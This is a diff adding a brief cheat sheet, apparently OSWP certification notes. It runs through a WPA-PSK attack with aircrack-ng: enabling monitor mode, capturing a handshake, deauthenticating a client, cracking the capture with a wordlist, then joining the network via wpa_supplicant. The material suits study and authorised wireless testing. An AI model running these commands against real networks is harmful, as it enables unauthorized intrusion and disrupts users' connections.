@@ -1,0 +1,36 @@
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng -c 1 -w wpa --essid OSWP --bssid 10:FE:ED:xx:xx:xx wlan0
+
+sudo aireplay-ng -0 1 -a 10:FE:ED:D1:xx:xx -c 30:07:4D:57:xx:xx wlan0  // -c= client
+
+sudo aircrack-ng -w hash wpa-01.cap
+
+## connect ap via terminal
+
+
+nano wpa_supplicant.conf
+```
+network={
+  ssid="<ESSID>"
+  psk="<PSK>"
+  key_mgmt=WPA-PSK
+}
+
+```
+
+## connect
+
+```
+$ sudo wpa_supplicant -B -i <wireless interface> -c wpa_supplicant.conf
+
+```
+for ip address from dhcp
+
+```
+$ sudo dhclient <wireless interface>
+```
